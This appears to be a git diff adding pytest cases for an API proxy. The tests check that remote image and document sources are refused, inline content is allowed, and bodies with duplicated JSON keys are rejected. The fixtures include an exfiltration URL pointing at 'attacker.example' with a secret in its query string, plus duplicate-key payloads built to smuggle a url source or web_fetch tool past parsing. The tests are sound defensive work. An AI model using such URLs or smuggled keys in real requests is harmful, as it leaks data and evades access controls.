@@ -76,6 +76,32 @@ async def test_remote_mcp_servers_are_refused(upstream, run_token):
     assert upstream == []
 
 
+_REMOTE_IMAGE = {"type": "image", "source": {"type": "url", "url": "https://attacker.example/?d=secret"}}
+
+
+@pytest.mark.parametrize(
+    "body",
+    [
+        {"messages": [{"role": "user", "content": [_REMOTE_IMAGE]}]},
+        {"messages": [{"role": "user", "content": [{"type": "document", "source": {"type": "file", "file_id": "file_1"}}]}]},
+        {"messages": [{"role": "user", "content": [{"type": "tool_result", "tool_use_id": "t", "content": [_REMOTE_IMAGE]}]}]},
+        {"system": [_REMOTE_IMAGE], "messages": []},
+    ],
+)
+async def test_remote_content_sources_are_refused(upstream, run_token, body):
+    assert (await _post("v1/messages", body, run_token)).status_code == 403
+    assert upstream == []
+
+
+async def test_inline_content_sources_are_allowed(upstream, run_token):
+    content = [
+        {"type": "image", "source": {"type": "base64", "media_type": "image/png", "data": "AAAA"}},
+        {"type": "document", "source": {"type": "text", "media_type": "text/plain", "data": "hello"}},
+        {"type": "tool_use", "id": "t", "name": "Write", "input": {"source": {"type": "url"}}},
+    ]
+    assert (await _post("v1/messages", {"messages": [{"role": "user", "content": content}]}, run_token)).status_code == 200
+
+
 async def test_web_search_is_allowed_by_default(upstream, run_token):
     assert (await _post("v1/messages", {"tools": [{"type": "web_search_20250305", "name": "web_search"}]}, run_token)).status_code == 200
 
@@ -91,6 +117,19 @@ async def test_other_paths_are_refused(upstream, run_token):
 
 async def test_non_json_body_is_refused(upstream, run_token):
     assert (await _send("v1/messages", run_token, content=b"nope")).status_code == 400
+    assert upstream == []
+
+
+@pytest.mark.parametrize(
+    "raw_body",
+    [
+        b'{"messages":[{"role":"user","content":[{"type":"image","source":{"type":"url","url":"https://x.example","type":"base64"}}]}]}',
+        b'{"tools":[{"type":"web_fetch_20250910","name":"web_fetch","type":"custom"}]}',
+        b'{"messages":[{"role":"user","content":[{"type":"image","source":{"type":"url"},"source":{"type":"base64"}}]}]}',
+    ],
+)
+async def test_duplicated_json_keys_are_refused(upstream, run_token, raw_body):
+    assert (await _send("v1/messages", run_token, content=raw_body)).status_code == 400
     assert upstream == []
 
 
